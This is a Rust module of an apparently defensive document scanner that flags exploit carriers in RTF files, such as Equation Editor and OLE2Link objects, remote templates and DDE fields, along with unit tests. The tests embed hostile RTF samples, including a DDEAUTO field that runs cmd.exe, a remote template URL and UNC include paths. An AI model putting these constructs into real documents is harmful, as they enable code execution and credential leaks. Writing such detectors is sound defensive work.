//! Rich Text Format inspection. RTF is a common carrier for exploits: it can
//! embed OLE objects (Equation Editor, Package, OLE2Link), fetch remote
//! templates and run field instructions such as DDE. The document is scanned
//! for those control words and fields without being rendered; obfuscation
//! that splits control words may hide some of them, which a note states.

use std::collections::BTreeMap;
use std::sync::OnceLock;

use regex::bytes::Regex as BytesRegex;

use super::document::DocumentReport;

/// Control words counted and shown as properties.
const INTERESTING: &[&str] = &[
    "object",
    "objemb",
    "objlink",
    "objautlink",
    "objupdate",
    "objocx",
    "objdata",
    "objclass",
    "template",
    "field",
    "fldinst",
    "bin",
    "datastore",
];
const MAX_CLASSES: usize = 32;
/// Hex characters decoded from the start of each `\objdata` block, enough for
/// the OLE1 header and class name.
const OBJDATA_HEAD_HEX: usize = 512;

pub(super) fn is_rtf(bytes: &[u8]) -> bool {
    bytes.starts_with(b"{\\rt")
}

fn regex(cell: &'static OnceLock<BytesRegex>, pattern: &str) -> &'static BytesRegex {
    cell.get_or_init(|| BytesRegex::new(pattern).expect("valid RTF regex"))
}

/// Class name from the OLE1 header at the start of `\objdata`:
/// version (u32), format (u32), name length (u32), name.
fn objdata_class(hex: &[u8]) -> Option<String> {
    let bytes: Vec<u8> = hex
        .as_chunks::<2>()
        .0
        .iter()
        .map_while(|pair| {
            let text = std::str::from_utf8(pair).ok()?;
            u8::from_str_radix(text, 16).ok()
        })
        .collect();
    let length = u32::from_le_bytes(bytes.get(8..12)?.try_into().ok()?) as usize;
    if !(2..=64).contains(&length) {
        return None;
    }
    let name = bytes.get(12..12 + length)?;
    let name = name.strip_suffix(&[0]).unwrap_or(name);
    name.iter()
        .all(|byte| byte.is_ascii_graphic())
        .then(|| String::from_utf8_lossy(name).into_owned())
}

/// Undoes RTF text escapes in a field or template argument: `\\` is a
/// backslash and `\{`, `\}` are braces, so `\\\\host\\share` is the UNC
/// path `\\host\share`.
fn unescape(text: &str) -> String {
    let mut output = String::with_capacity(text.len());
    let mut characters = text.chars().peekable();
    while let Some(character) = characters.next() {
        if character == '\\'
            && let Some(&next) = characters.peek()
            && matches!(next, '\\' | '{' | '}')
        {
            output.push(next);
            characters.next();
        } else {
            output.push(character);
        }
    }
    output
}

fn class_risk(class: &str) -> Option<&'static str> {
    let lowered = class.to_ascii_lowercase();
    if lowered.starts_with("equation.") {
        Some("Equation Editor object, the target of CVE-2017-11882 and CVE-2018-0802 exploits")
    } else if lowered == "package" {
        Some("embedded Package object, which can carry an executable or script")
    } else if lowered == "ole2link" {
        Some("OLE2Link object, used to load remote content (CVE-2017-0199 style)")
    } else if lowered == "htmlfile" || lowered.starts_with("script") {
        Some("HTML or script object embedded in the document")
    } else {
        None
    }
}

pub(super) fn inspect_rtf(bytes: &[u8]) -> DocumentReport {
    static CONTROL: OnceLock<BytesRegex> = OnceLock::new();
    static CLASS: OnceLock<BytesRegex> = OnceLock::new();
    static OBJDATA: OnceLock<BytesRegex> = OnceLock::new();
    static TEMPLATE: OnceLock<BytesRegex> = OnceLock::new();
    static FIELD: OnceLock<BytesRegex> = OnceLock::new();

    let mut report = DocumentReport::new("RTF document");
    report.macros_present = Some(false);
    report.notes.push(
        "RTF is scanned for control words and field instructions without rendering; \
         obfuscation that splits control words can hide objects"
            .to_owned(),
    );

    let mut counts = BTreeMap::<&'static str, usize>::new();
    for captures in regex(&CONTROL, r"\\([a-z]{1,32})").captures_iter(bytes) {
        let word = &captures[1];
        if let Some(known) = INTERESTING.iter().find(|known| known.as_bytes() == word) {
            *counts.entry(known).or_default() += 1;
        }
    }
    for (word, count) in &counts {
        report.property(&format!("\\{word}"), count.to_string());
    }
    let count = |word: &str| counts.get(word).copied().unwrap_or(0);

    // Object class names, from \objclass and from the \objdata OLE1 header.
    let mut classes = Vec::<String>::new();
    let mut add_class = |name: String| {
        let name = name.trim().to_owned();
        if !name.is_empty() && !classes.contains(&name) && classes.len() < MAX_CLASSES {
            classes.push(name);
        }
    };
    for captures in regex(&CLASS, r"\\objclass\s+([^\\{}\s]{1,64})").captures_iter(bytes) {
        add_class(String::from_utf8_lossy(&captures[1]).into_owned());
    }
    for found in regex(&OBJDATA, r"\\objdata").find_iter(bytes) {
        // Hex digits may be split by whitespace or line breaks.
        let hex: Vec<u8> = bytes[found.end()..]
            .iter()
            .take_while(|byte| **byte != b'}')
            .filter(|byte| byte.is_ascii_hexdigit())
            .take(OBJDATA_HEAD_HEX)
            .copied()
            .collect();
        if let Some(class) = objdata_class(&hex) {
            add_class(class);
        }
    }
    for class in &classes {
        report.property("object class", class.clone());
        if let Some(risk) = class_risk(class) {
            report
                .suspicious_properties
                .push(format!("RTF embeds {class}: {risk}"));
        }
    }

    for captures in regex(&TEMPLATE, r"\{\\\*\\template\s+([^}]{1,2048})\}").captures_iter(bytes) {
        let target = unescape(String::from_utf8_lossy(&captures[1]).trim());
        let remote = target.contains("://") || target.starts_with("\\\\");
        report.target("template", &target);
        if remote {
            report
                .suspicious_properties
                .push(format!("RTF loads a remote template: {target}"));
        }
    }

    let field = regex(
        &FIELD,
        r#"(?i)\b(DDEAUTO|DDE|INCLUDEPICTURE|INCLUDETEXT|HYPERLINK)\b\s*(?:\\[a-z]+\s*)*"([^"]{1,2048})""#,
    );
    for captures in field.captures_iter(bytes) {
        let kind = String::from_utf8_lossy(&captures[1]).to_ascii_uppercase();
        let target = unescape(&String::from_utf8_lossy(&captures[2]));
        report.target(&format!("field {kind}"), &target);
        match kind.as_str() {
            "DDE" | "DDEAUTO" => report
                .suspicious_properties
                .push(format!("RTF field runs a DDE command: {target}")),
            "INCLUDEPICTURE" | "INCLUDETEXT"
                if target.contains("://") || target.starts_with("\\\\") =>
            {
                report.suspicious_properties.push(format!(
                    "RTF field fetches external content when opened: {target}"
                ));
            }
            _ => {}
        }
    }

    if count("objautlink") + count("objupdate") > 0 && count("object") > 0 {
        report.suspicious_properties.push(
            "RTF object updates automatically when opened (\\objautlink or \\objupdate)".to_owned(),
        );
    }
    if !bytes.starts_with(b"{\\rtf1") {
        report.suspicious_properties.push(
            "RTF header is not {\\rtf1; Word accepts it, and exploit documents often use it to evade detection"
                .to_owned(),
        );
    }
    if count("bin") > 0 {
        report
            .notes
            .push("raw binary data (\\bin) is present and is not decoded".to_owned());
    }
    report
}

#[cfg(test)]
mod tests {
    use super::{inspect_rtf, is_rtf, objdata_class};

    /// OLE1 header for an embedded object of `class`, as RTF hex.
    fn ole1_hex(class: &str) -> String {
        let mut bytes = Vec::new();
        bytes.extend(0x0501u32.to_le_bytes());
        bytes.extend(2u32.to_le_bytes());
        bytes.extend((class.len() as u32 + 1).to_le_bytes());
        bytes.extend(class.as_bytes());
        bytes.push(0);
        bytes.iter().map(|byte| format!("{byte:02x}")).collect()
    }

    #[test]
    fn detects_rtf_including_the_truncated_header() {
        assert!(is_rtf(b"{\\rtf1\\ansi hello}"));
        assert!(is_rtf(b"{\\rt\\ansi}"));
        assert!(!is_rtf(b"%PDF-1.7"));
    }

    #[test]
    fn reads_the_class_name_from_objdata_even_when_split() {
        let hex = ole1_hex("Equation.3");
        let split: String = hex
            .as_bytes()
            .chunks(7)
            .map(|chunk| format!("{}\r\n", std::str::from_utf8(chunk).unwrap()))
            .collect();
        let document = format!("{{\\rtf1{{\\object\\objemb{{\\*\\objdata {split}}}}}}}");
        let report = inspect_rtf(document.as_bytes());
        let text = report.suspicious_properties.join("\n");
        assert!(text.contains("Equation.3"), "{text}");
        assert!(text.contains("CVE-2017-11882"), "{text}");
        assert!(
            report
                .properties
                .iter()
                .any(|property| property.name == "\\objdata" && property.value == "1")
        );
        assert_eq!(objdata_class(b"zz"), None);
    }

    #[test]
    fn flags_ole2link_autoupdate_and_a_remote_template() {
        let document = b"{\\rtf1{\\*\\template http://203.0.113.9/t.dotm}\
            {\\object\\objautlink\\objupdate{\\*\\objclass OLE2Link}}}";
        let report = inspect_rtf(document);
        let text = report.suspicious_properties.join("\n");
        assert!(
            text.contains("remote template: http://203.0.113.9/t.dotm"),
            "{text}"
        );
        assert!(text.contains("OLE2Link"), "{text}");
        assert!(text.contains("updates automatically"), "{text}");
        assert_eq!(report.external_targets[0].relationship, "template");
    }

    #[test]
    fn flags_dde_and_external_include_fields() {
        let document =
            br#"{\rtf1{\field{\*\fldinst DDEAUTO "c:\\windows\\system32\\cmd.exe /c calc"}}
            {\field{\*\fldinst INCLUDEPICTURE \d "http://x.example.test/p.png"}}}"#;
        let report = inspect_rtf(document);
        let text = report.suspicious_properties.join("\n");
        assert!(
            text.contains(r"DDE command: c:\windows\system32\cmd.exe /c calc"),
            "{text}"
        );
        assert!(text.contains("fetches external content"), "{text}");
        assert!(
            report
                .external_targets
                .iter()
                .any(|target| target.relationship == "field INCLUDEPICTURE")
        );
    }

    #[test]
    fn unc_include_paths_are_unescaped_and_flagged() {
        let document = br#"{\rtf1{\field{\*\fldinst INCLUDEPICTURE "\\\\203.0.113.5\\s\\a.png"}}}"#;
        let report = inspect_rtf(document);
        assert_eq!(report.external_targets[0].target, r"\\203.0.113.5\s\a.png");
        assert!(
            report
                .suspicious_properties
                .iter()
                .any(|finding| finding.contains("fetches external content"))
        );
        assert_eq!(super::unescape(r"a\{b\}c\\d\e"), r"a{b}c\d\e");
    }

    #[test]
    fn a_plain_document_has_no_findings() {
        let report =
            inspect_rtf(b"{\\rtf1\\ansi\\deff0 {\\fonttbl {\\f0 Arial;}} Hello \\b world\\b0.}");
        assert!(
            report.suspicious_properties.is_empty(),
            "{:?}",
            report.suspicious_properties
        );
        assert_eq!(report.kind, "RTF document");
    }

    #[test]
    fn the_short_header_is_flagged() {
        let report = inspect_rtf(b"{\\rt\\ansi text}");
        assert!(
            report
                .suspicious_properties
                .iter()
                .any(|finding| finding.contains("not {\\rtf1"))
        );
    }
}
